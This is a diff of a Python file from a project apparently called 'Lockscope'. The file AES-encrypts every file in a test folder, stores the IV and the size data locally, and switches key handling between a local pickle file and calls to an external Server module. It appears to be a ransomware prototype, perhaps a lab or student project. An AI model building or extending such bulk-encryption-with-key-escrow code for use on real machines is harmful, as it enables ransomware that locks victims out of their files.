@@ -1,7 +1,7 @@
 
 import pickle
 import pathlib
-from Server import Server
+import Server
 
 from Crypto.Cipher import AES
 from Crypto import Random
@@ -13,19 +13,18 @@ class AEScipher:
 
     # Initialization of variables
     def __init__(self): 
-        self.server = Server()
         self.block_size = 32
+        self.key_path = r"C:\Users\User\Desktop\Lockscope\Fase 3\key.pkl"
         self.files_path = pathlib.Path(r"C:\Users\User\Desktop\Test Files")
         self.size_bytes_path = r"C:\Users\User\Desktop\Lockscope\Fase 3\size_bytes.txt"
         self.iv_path = r"C:\Users\User\Desktop\Lockscope\Fase 3\iv.txt"
-        
 
     # Generate the AES key
     def generate_aes_key(self):
         aes_key = Random.new().read(self.block_size)
         
-        self.server.send_file(aes_key)
-        
+        with open(self.key_path, "wb") as key_file:
+            pickle.dump(aes_key, key_file)
 
     # Open the plain file and read data
     def open_file(self, path):
@@ -51,7 +50,8 @@ class AEScipher:
         with open(self.iv_path, "wb") as iv_file:
             iv_file.write(iv)
 
-        aes_key = self.server.recive_file()
+        with open(self.key_path, "rb") as key_file:
+            aes_key = pickle.load(key_file)
 
         cipher = AES.new(aes_key, AES.MODE_CBC, iv)
         
@@ -95,6 +95,9 @@ class AEScipher:
                 cipher_data = b'\x00'
                 rest_content = b'\x00'
 
+        Server.client()
+
+
     # Open the cipher file and read data
     def open_file_encrypted(self, path):
 
@@ -115,9 +118,11 @@ class AEScipher:
         
         print("\n-----DECRYPT FILE-----")
 
+        Server.receiver()
+
         with open(self.key_path, "rb") as key_file:
             aes_key = pickle.load(key_file)
-        
+
         with open(self.iv_path, "rb") as iv_file:
             iv = iv_file.read()
 
@@ -160,8 +165,8 @@ class AEScipher:
 if __name__ == '__main__':
     cipher = AEScipher()
     try:
-        cipher.encrypt()
-        #cipher.decrypt()
+        #cipher.encrypt()
+        cipher.decrypt()
 
     except KeyboardInterrupt:
         exit(1)
